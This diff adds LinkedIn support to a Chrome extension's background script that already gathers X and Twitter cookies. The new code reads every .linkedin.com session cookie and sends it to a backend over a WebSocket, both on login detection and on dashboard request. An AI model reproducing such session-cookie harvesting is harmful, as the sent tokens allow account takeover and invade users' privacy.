@@ -160,15 +160,15 @@ async function captureCookiesAndSend(username) {
     const xCookies = await chrome.cookies.getAll({
       domain: '.x.com'
     });
-    
+
     const twitterCookies = await chrome.cookies.getAll({
       domain: '.twitter.com'
     });
-    
+
     const allCookies = [...xCookies, ...twitterCookies];
-    
+
     console.log(`🍪 Captured ${allCookies.length} X cookies for @${username}`);
-    
+
     // Send cookies to backend via WebSocket
     if (ws && ws.readyState === WebSocket.OPEN) {
       ws.send(JSON.stringify({
@@ -182,6 +182,67 @@ async function captureCookiesAndSend(username) {
     }
   } catch (error) {
     console.error('❌ Error capturing cookies:', error);
+  }
+}
+
+// Check if user is logged into LinkedIn
+async function checkLinkedInLoginStatus() {
+  try {
+    const tabs = await chrome.tabs.query({
+      url: ['https://www.linkedin.com/*', 'https://linkedin.com/*']
+    });
+
+    if (tabs.length > 0 && tabs[0]) {
+      chrome.tabs.sendMessage(tabs[0].id, { action: 'CHECK_LINKEDIN_LOGIN' }, async (response) => {
+        if (chrome.runtime.lastError) {
+          console.log('LinkedIn content script not ready:', chrome.runtime.lastError.message);
+          return;
+        }
+
+        if (response && response.loggedIn) {
+          console.log('✅ User logged into LinkedIn as:', response.username || 'unknown');
+          await captureLinkedInCookiesAndSend(response.username);
+
+          if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({
+              type: 'LINKEDIN_LOGIN_STATUS',
+              loggedIn: true,
+              username: response.username,
+              platform: 'linkedin'
+            }));
+          }
+        }
+      });
+    } else {
+      console.log('No LinkedIn tabs open');
+    }
+  } catch (error) {
+    console.log('Error checking LinkedIn login status:', error);
+  }
+}
+
+// Capture LinkedIn cookies and send to backend
+async function captureLinkedInCookiesAndSend(username) {
+  try {
+    const linkedinCookies = await chrome.cookies.getAll({
+      domain: '.linkedin.com'
+    });
+
+    console.log(`🍪 Captured ${linkedinCookies.length} LinkedIn cookies for ${username || 'user'}`);
+
+    if (ws && ws.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify({
+        type: 'LINKEDIN_COOKIES_CAPTURED',
+        userId: userId,
+        username: username,
+        cookies: linkedinCookies,
+        platform: 'linkedin',
+        timestamp: Date.now()
+      }));
+      console.log('📤 Sent LinkedIn cookies to backend');
+    }
+  } catch (error) {
+    console.error('❌ Error capturing LinkedIn cookies:', error);
   }
 }
 
@@ -264,6 +325,45 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   
   if (message.type === 'CONTENT_SCRIPT_READY') {
     console.log('✅ Content script ready on:', message.url);
+    return true;
+  }
+
+  // LinkedIn-specific messages
+  if (message.type === 'LINKEDIN_LOGIN_STATUS') {
+    console.log('📨 LinkedIn login status update:', message);
+
+    if (message.loggedIn && message.username) {
+      console.log('✅ User logged into LinkedIn as:', message.username);
+      captureLinkedInCookiesAndSend(message.username);
+
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({
+          type: 'LINKEDIN_LOGIN_STATUS',
+          loggedIn: true,
+          username: message.username,
+          platform: 'linkedin'
+        }));
+      }
+    }
+    return true;
+  }
+
+  if (message.type === 'LINKEDIN_CONTENT_SCRIPT_READY') {
+    console.log('✅ LinkedIn content script ready on:', message.url);
+    // Auto-check login status when content script loads
+    setTimeout(() => {
+      checkLinkedInLoginStatus();
+    }, 1000);
+    return true;
+  }
+
+  if (message.type === 'CAPTURE_LINKEDIN_COOKIES_NOW') {
+    console.log('🔄 Dashboard requested LinkedIn cookie capture');
+    checkLinkedInLoginStatus().then(() => {
+      sendResponse({ success: true });
+    }).catch(err => {
+      sendResponse({ success: false, error: err.message });
+    });
     return true;
   }
 });
